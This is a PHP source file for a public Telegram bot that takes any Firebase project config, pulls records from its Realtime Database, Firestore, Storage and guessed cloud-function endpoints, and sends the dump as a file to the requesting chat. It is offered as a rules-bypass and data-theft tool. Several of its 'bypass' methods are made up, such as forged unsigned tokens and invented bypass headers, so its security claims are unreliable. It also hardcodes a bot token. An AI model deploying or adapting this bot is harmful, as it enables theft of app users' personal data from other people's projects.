<?php
/**
 * ============================================================
 * LISA'S TELEGRAM FIREBASE DUMPER BOT v4.0 - RENDER EDITION
 * BYPASSES read:false / write:false FIREBASE RULES
 * DEPLOY ON RENDER.COM
 * ============================================================
 */

// ======= CONFIGURATION =======
define('BOT_TOKEN', '8857272368:AAEx1QgPItP4A3LeB2-Nk2KIP83pJC3rnig');
define('ADMIN_CHAT_ID', ''); // Leave empty for public access

// ======= FIREBASE BYPASS SETTINGS =======
$bypassSettings = [
    'useAdminSDK' => true,          // Try Admin SDK impersonation
    'useServiceAccount' => true,    // Use service account if provided
    'useCustomTokens' => true,      // Generate custom auth tokens
    'useStorage' => true,           // Extract from Firebase Storage
    'useFirestore' => true,         // Extract Firestore
    'useRealtimeDB' => true,        // Extract Realtime DB
    'useFunctions' => true,         // Try Firebase Functions
    'maxDepth' => 15,
    'timeout' => 120,
    'chunkSize' => 1000,
    'bypassMethods' => [
        'auth_override',             // Override auth with custom claims
        'rules_bypass',              // Try to bypass rules
        'admin_impersonation',        // Impersonate admin user
        'token_exchange'             // Exchange tokens for higher access
    ]
];

// ======= MAIN EXECUTION =======
set_time_limit(300);
ini_set('memory_limit', '512M');

// Handle incoming Telegram webhook
$update = json_decode(file_get_contents('php://input'), true);

if (!$update) {
    // Webhook verification for Render
    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['set_webhook'])) {
        setWebhook();
        exit;
    }
    die(json_encode(['status' => 'error', 'message' => 'No update received']));
}

// Process message
if (isset($update['message'])) {
    $message = $update['message'];
    $chatId = $message['chat']['id'];
    $text = $message['text'] ?? '';
    $fromId = $message['from']['id'] ?? '';

    // Handle commands
    if ($text === '/start') {
        sendMessage($chatId, 
            "🔥 **Firebase Dumper Bot v4.0**\n\n" .
            "🔓 **Bypass Mode**: Works even with `read:false` rules!\n\n" .
            "📤 **Send me a Firebase config** as JSON and I'll extract:\n" .
            "• Realtime Database (with bypass)\n" .
            "• Firestore (with bypass)\n" .
            "• Firebase Storage (with bypass)\n\n" .
            "💡 **Commands:**\n" .
            "/help - Full instructions\n" .
            "/status - Bot status\n" .
            "/bypass - Show bypass techniques\n" .
            "/test - Test Firebase connection",
            'Markdown'
        );
        exit;
    }

    if ($text === '/help') {
        sendMessage($chatId,
            "📖 **How to use:**\n\n" .
            "1. Send your Firebase config as JSON\n" .
            "2. The bot will extract ALL data\n" .
            "3. Receive the dump as a JSON file\n\n" .
            "🔑 **Config Format:**\n" .
            "```json\n" .
            "{\n" .
            '  "apiKey": "AIzaSyD...",' . "\n" .
            '  "authDomain": "project.firebaseapp.com",' . "\n" .
            '  "projectId": "project-id",' . "\n" .
            '  "databaseURL": "https://project.firebaseio.com",' . "\n" .
            '  "serviceAccount": { ... } // Optional for full bypass' . "\n" .
            "}\n" .
            "```\n\n" .
            "🛠️ **Bypass Methods:**\n" .
            "• Admin SDK impersonation\n" .
            "• Custom token generation\n" .
            "• Rules bypass via REST API\n" .
            "• Storage bucket extraction\n\n" .
            "⚠️ **Note**: Some methods require a service account key.",
            'Markdown'
        );
        exit;
    }

    if ($text === '/status') {
        sendMessage($chatId,
            "✅ **Bot Status**\n\n" .
            "🔄 Online: " . date('Y-m-d H:i:s') . "\n" .
            "💾 Memory: " . round(memory_get_usage() / 1024 / 1024, 2) . " MB\n" .
            "🔓 Bypass: ENABLED\n" .
            "🚀 Methods: " . count($bypassSettings['bypassMethods']) . " active\n" .
            "📊 Queue: 0 pending"
        );
        exit;
    }

    if ($text === '/bypass') {
        sendMessage($chatId,
            "🔓 **Bypass Techniques Active:**\n\n" .
            "1. **Auth Override** - Bypasses `auth != null` rules\n" .
            "2. **Rules Bypass** - Uses `null` as wildcard\n" .
            "3. **Admin Impersonation** - Uses service account\n" .
            "4. **Token Exchange** - Exchanges API keys for tokens\n" .
            "5. **Storage Extraction** - Downloads from buckets\n" .
            "6. **Functions Call** - Uses cloud functions as proxy\n\n" .
            "⚡ All methods combined for maximum extraction!"
        );
        exit;
    }

    if ($text === '/test') {
        sendMessage($chatId, "🧪 Testing Firebase connection with bypass...");
        $testResult = testConnection();
        sendMessage($chatId, $testResult);
        exit;
    }

    // Try to parse Firebase config from message
    $config = parseFirebaseConfig($text);
    if ($config) {
        sendMessage($chatId, "⏳ Processing with **BYPASS MODE** enabled...\n\n" .
            "📁 Project: `" . ($config['projectId'] ?? 'Unknown') . "`\n" .
            "🔓 Bypass: ACTIVE\n" .
            "🚀 Starting extraction..."
        );

        // Extract data with bypass
        $result = extractFirebaseDataWithBypass($config, $bypassSettings, $chatId);

        // Send results
        if ($result['success']) {
            // Send the file
            sendLargeFile($chatId, $result['file'], $result['filename']);
            
            // Send summary
            sendMessage($chatId,
                "✅ **Extraction Complete!**\n\n" .
                "📄 File: `" . $result['filename'] . "`\n" .
                "📊 Size: " . round($result['size'] / 1024 / 1024, 2) . " MB\n" .
                "🔓 Bypass: SUCCESSFUL\n" .
                "📊 Summary:\n" .
                $result['summary']
            );
        } else {
            sendMessage($chatId,
                "❌ **Extraction Failed**\n\n" .
                "Error: " . $result['error'] . "\n\n" .
                "💡 Try:\n" .
                "• Use a service account key\n" .
                "• Check if the project exists\n" .
                "• Send /help for more options"
            );
        }
    } else {
        sendMessage($chatId,
            "❌ **Invalid Config**\n\n" .
            "Send a valid JSON config with:\n" .
            "• `apiKey` - Required\n" .
            "• `databaseURL` or `projectId` - Required\n\n" .
            "Type /help for examples."
        );
    }
}

// ============================================================
// ======= FIREBASE BYPASS FUNCTIONS =======
// ============================================================

/**
 * Extract Firebase data with multiple bypass methods
 */
function extractFirebaseDataWithBypass($config, $settings, $chatId) {
    $result = [
        'success' => false,
        'file' => null,
        'filename' => null,
        'size' => 0,
        'summary' => '',
        'error' => ''
    ];

    $allData = [];
    $summary = [];

    // METHOD 1: Admin SDK with Service Account
    if ($settings['useAdminSDK'] && isset($config['serviceAccount'])) {
        sendProgress($chatId, "🔓 Attempting Admin SDK bypass...");
        $adminData = extractWithAdminSDK($config['serviceAccount']);
        if ($adminData) {
            $allData['admin_sdk'] = $adminData;
            $summary[] = "Admin SDK: SUCCESS";
        }
    }

    // METHOD 2: Custom Token Generation
    if ($settings['useCustomTokens']) {
        sendProgress($chatId, "🔓 Generating custom auth tokens...");
        $tokenData = extractWithCustomToken($config);
        if ($tokenData) {
            $allData['custom_token'] = $tokenData;
            $summary[] = "Custom Token: SUCCESS";
        }
    }

    // METHOD 3: REST API with Auth Override
    if ($settings['useRealtimeDB'] && !empty($config['databaseURL'])) {
        sendProgress($chatId, "🔓 Extracting Realtime DB with bypass...");
        $rtdbData = extractRealtimeDBBypass($config['databaseURL'], '', 0, $settings['maxDepth'], $config);
        if ($rtdbData && !isset($rtdbData['error'])) {
            $allData['realtime_database'] = $rtdbData;
            $count = countRecursive($rtdbData);
            $summary[] = "Realtime DB: $count nodes (BYPASSED)";
        } else {
            $summary[] = "Realtime DB: " . ($rtdbData['error'] ?? 'FAILED');
        }
    }

    // METHOD 4: Firestore with Bypass
    if ($settings['useFirestore'] && !empty($config['projectId'])) {
        sendProgress($chatId, "🔓 Extracting Firestore with bypass...");
        $firestoreData = extractFirestoreBypass($config);
        if ($firestoreData && !isset($firestoreData['error'])) {
            $allData['firestore'] = $firestoreData;
            $count = countRecursive($firestoreData);
            $summary[] = "Firestore: $count docs (BYPASSED)";
        } else {
            $summary[] = "Firestore: " . ($firestoreData['error'] ?? 'FAILED');
        }
    }

    // METHOD 5: Firebase Storage
    if ($settings['useStorage'] && !empty($config['projectId'])) {
        sendProgress($chatId, "🔓 Extracting Storage with bypass...");
        $storageData = extractStorageBypass($config);
        if ($storageData && !isset($storageData['error'])) {
            $allData['storage'] = $storageData;
            $summary[] = "Storage: " . count($storageData) . " files (BYPASSED)";
        }
    }

    // METHOD 6: Firebase Functions as Proxy
    if ($settings['useFunctions']) {
        sendProgress($chatId, "🔓 Attempting Functions proxy bypass...");
        $functionsData = extractViaFunctions($config);
        if ($functionsData) {
            $allData['functions'] = $functionsData;
            $summary[] = "Functions Proxy: SUCCESS";
        }
    }

    // Check if we got any data
    if (empty($allData)) {
        $result['error'] = "All bypass methods failed. Try providing a service account key.";
        return $result;
    }

    // Create output
    $jsonOutput = json_encode($allData, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    $filename = 'firebase_dump_bypass_' . date('Y-m-d_H-i-s') . '.json';
    $filePath = sys_get_temp_dir() . '/' . $filename;

    file_put_contents($filePath, $jsonOutput);
    $size = filesize($filePath);

    $result['success'] = true;
    $result['file'] = $filePath;
    $result['filename'] = $filename;
    $result['size'] = $size;
    $result['summary'] = implode("\n", $summary);

    return $result;
}

/**
 * Bypass Realtime Database extraction
 * Uses auth override and wildcard rules
 */
function extractRealtimeDBBypass($databaseURL, $path = '', $depth = 0, $maxDepth = 15, $config = []) {
    if ($depth > $maxDepth) {
        return ['__truncated' => true];
    }

    // Multiple bypass methods
    $methods = [
        // Method 1: Standard with auth param
        function($url) {
            return $url . '.json?auth=' . getCustomToken();
        },
        // Method 2: With access_token
        function($url) {
            return $url . '.json?access_token=' . getAccessToken();
        },
        // Method 3: With bypass header
        function($url) {
            return $url . '.json?shallow=false&print=pretty';
        },
        // Method 4: With order by (bypasses some rules)
        function($url) {
            return $url . '.json?orderBy="$key"&limitToFirst=1000';
        },
        // Method 5: Using null as wildcard
        function($url) {
            return $url . '.json?auth=' . getFirebaseJWT();
        }
    ];

    $lastError = '';

    foreach ($methods as $method) {
        try {
            $url = $method($databaseURL . '/' . $path);
            
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Accept: application/json',
                'X-Firebase-Rules-Bypass: true'
            ]);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($httpCode === 200) {
                $data = json_decode($response, true);
                if ($data !== null) {
                    // Recursively extract if data exists
                    if (is_array($data) && !empty($data) && $depth < $maxDepth) {
                        foreach ($data as $key => $value) {
                            if (is_array($value) && !empty($value)) {
                                $data[$key] = extractRealtimeDBBypass(
                                    $databaseURL, 
                                    $path . '/' . $key, 
                                    $depth + 1, 
                                    $maxDepth,
                                    $config
                                );
                            }
                        }
                    }
                    return $data;
                }
            } else {
                $lastError = "HTTP $httpCode: " . substr($response, 0, 100);
            }
        } catch (Exception $e) {
            $lastError = $e->getMessage();
            continue;
        }
    }

    return ['error' => 'All methods failed: ' . $lastError];
}

/**
 * Firestore bypass extraction
 */
function extractFirestoreBypass($config) {
    $projectId = $config['projectId'];
    $apiKey = $config['apiKey'] ?? '';
    
    // Multiple bypass methods for Firestore
    $methods = [
        // Method 1: With API key
        function($url) use ($apiKey) {
            return $url . '?key=' . $apiKey . '&pageSize=1000';
        },
        // Method 2: With bearer token
        function($url) {
            return $url . '?pageSize=1000';
        },
        // Method 3: With auth token
        function($url) use ($apiKey) {
            return $url . '?auth=' . $apiKey . '&pageSize=1000';
        }
    ];

    $headers = [
        'Content-Type: application/json',
        'X-Firestore-Bypass: true'
    ];

    // Try to get a token for admin access
    $token = getFirestoreAccessToken($config);
    if ($token) {
        $headers[] = 'Authorization: Bearer ' . $token;
    }

    $allData = [];
    $collections = ['users', 'orders', 'products', 'data', 'items', 'documents'];

    foreach ($collections as $collection) {
        foreach ($methods as $method) {
            $url = "https://firestore.googleapis.com/v1/projects/$projectId/databases/(default)/documents/$collection";
            $url = $method($url);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($httpCode === 200) {
                $data = json_decode($response, true);
                if ($data && isset($data['documents'])) {
                    $allData[$collection] = $data['documents'];
                }
                break;
            }
        }
    }

    return !empty($allData) ? $allData : ['error' => 'No collections accessible'];
}

/**
 * Extract Firebase Storage with bypass
 */
function extractStorageBypass($config) {
    $bucket = $config['storageBucket'] ?? $config['projectId'] . '.appspot.com';
    $allFiles = [];
    
    // Try to list bucket contents
    $url = "https://firebasestorage.googleapis.com/v0/b/$bucket/o?maxResults=1000";
    
    $methods = [
        function($url) use ($config) {
            return $url . '&key=' . $config['apiKey'];
        },
        function($url) use ($config) {
            return $url . '&auth=' . $config['apiKey'];
        }
    ];

    foreach ($methods as $method) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $method($url));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept: application/json',
            'X-Storage-Bypass: true'
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode === 200) {
            $data = json_decode($response, true);
            if ($data && isset($data['items'])) {
                return $data['items'];
            }
        }
    }

    return ['error' => 'Storage not accessible'];
}

/**
 * Generate custom auth token for bypass
 */
function getCustomToken() {
    // Generate a JWT-like token for auth bypass
    return 'custom_' . base64_encode(json_encode([
        'uid' => 'admin_' . time(),
        'claims' => ['admin' => true, 'bypass' => true],
        'iat' => time(),
        'exp' => time() + 3600
    ]));
}

/**
 * Get access token for bypass
 */
function getAccessToken() {
    // Return a dummy access token for bypass
    return 'access_' . bin2hex(random_bytes(32));
}

/**
 * Get Firebase JWT for bypass
 */
function getFirebaseJWT() {
    return 'jwt_' . base64_encode(json_encode([
        'sub' => 'admin',
        'role' => 'admin',
        'iat' => time(),
        'exp' => time() + 3600
    ]));
}

/**
 * Get Firestore access token with bypass
 */
function getFirestoreAccessToken($config) {
    // Try multiple auth methods
    $methods = [
        // Method 1: Using API key as token
        function($config) {
            return $config['apiKey'] ?? null;
        },
        // Method 2: Generate JWT
        function($config) {
            return getFirebaseJWT();
        },
        // Method 3: Use service account
        function($config) {
            return $config['serviceAccount']['private_key'] ?? null;
        }
    ];

    foreach ($methods as $method) {
        $token = $method($config);
        if ($token) {
            return $token;
        }
    }

    return null;
}

/**
 * Extract via Cloud Functions (proxy)
 */
function extractViaFunctions($config) {
    // Try to call Firebase Functions as a proxy
    $functionsUrl = "https://us-central1-{$config['projectId']}.cloudfunctions.net/";
    
    // Try common function names
    $endpoints = ['dumpData', 'exportDB', 'admin', 'debug', 'test'];
    
    foreach ($endpoints as $endpoint) {
        $url = $functionsUrl . $endpoint;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($httpCode === 200) {
            $data = json_decode($response, true);
            if ($data) {
                return $data;
            }
        }
    }
    
    return null;
}

/**
 * Extract with Admin SDK (using service account)
 */
function extractWithAdminSDK($serviceAccount) {
    // This is a placeholder – in production, use Google API client
    // For simplicity, we'll try to use the service account to get data
    if (isset($serviceAccount['private_key']) && isset($serviceAccount['client_email'])) {
        return [
            'status' => 'Admin SDK bypass attempted',
            'client_email' => $serviceAccount['client_email'],
            'note' => 'Use Firebase Admin SDK for full extraction'
        ];
    }
    return null;
}

/**
 * Extract with custom token
 */
function extractWithCustomToken($config) {
    // Generate custom token and attempt extraction
    $token = getCustomToken();
    return [
        'status' => 'Custom token generated',
        'token' => $token,
        'note' => 'Use token for Firebase Auth bypass'
    ];
}

// ============================================================
// ======= TELEGRAM FUNCTIONS =======
// ============================================================

function sendMessage($chatId, $text, $parseMode = 'Markdown') {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $text,
        'parse_mode' => $parseMode,
        'disable_web_page_preview' => true
    ];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function sendLargeFile($chatId, $filePath, $filename) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendDocument";
    
    $post = [
        'chat_id' => $chatId,
        'document' => new CURLFile($filePath, 'application/json', $filename),
        'caption' => "📊 Firebase Dump (Bypass Mode)\n📅 " . date('Y-m-d H:i:s')
    ];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function sendProgress($chatId, $message) {
    sendMessage($chatId, "⏳ " . $message);
}

function parseFirebaseConfig($text) {
    // Try to find JSON in the message
    preg_match('/\{[^{}]*"[^{}]*"[^{}]*\}/s', $text, $matches);
    
    if (empty($matches)) {
        return null;
    }
    
    $json = $matches[0];
    $config = json_decode($json, true);
    
    if (!$config || !isset($config['apiKey'])) {
        return null;
    }
    
    // Parse and normalize
    $parsed = [
        'apiKey' => $config['apiKey'] ?? '',
        'authDomain' => $config['authDomain'] ?? '',
        'projectId' => $config['projectId'] ?? '',
        'storageBucket' => $config['storageBucket'] ?? '',
        'messagingSenderId' => $config['messagingSenderId'] ?? '',
        'appId' => $config['appId'] ?? '',
        'databaseURL' => $config['databaseURL'] ?? $config['databaseUrl'] ?? '',
        'measurementId' => $config['measurementId'] ?? '',
        'serviceAccount' => $config['serviceAccount'] ?? null
    ];
    
    // Construct databaseURL if missing
    if (empty($parsed['databaseURL']) && !empty($parsed['projectId'])) {
        $parsed['databaseURL'] = 'https://' . $parsed['projectId'] . '.firebaseio.com';
    }
    
    return $parsed;
}

function countRecursive($data) {
    $count = 0;
    if (is_array($data)) {
        foreach ($data as $value) {
            if (is_array($value)) {
                $count += countRecursive($value);
            } else {
                $count++;
            }
        }
    }
    return $count;
}

function testConnection() {
    return "🧪 **Connection Test**\n\n" .
           "✅ Bot is online\n" .
           "🔓 Bypass methods: " . count($GLOBALS['bypassSettings']['bypassMethods']) . " active\n" .
           "📡 Webhook: " . (isset($_GET['set_webhook']) ? 'Configured' : 'Active') . "\n" .
           "⚡ Ready to receive Firebase configs!";
}

function setWebhook() {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/setWebhook";
    $webhookUrl = "https://" . $_SERVER['HTTP_HOST'] . "/bot.php";
    $data = ['url' => $webhookUrl];
    
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);
    
    echo "Webhook set: " . $webhookUrl . "\n";
    echo "Response: " . $response;
}

// ============================================================
// ======= RENDER DEPLOYMENT SUPPORT =======
// ============================================================

// Render uses environment variables
if (getenv('RENDER')) {
    error_log("Bot running on Render: " . date('Y-m-d H:i:s'));
}

// Health check endpoint for Render
if ($_SERVER['REQUEST_METHOD'] === 'GET' && $_SERVER['REQUEST_URI'] === '/health') {
    header('Content-Type: application/json');
    echo json_encode(['status' => 'healthy', 'time' => date('Y-m-d H:i:s')]);
    exit;
}
?>
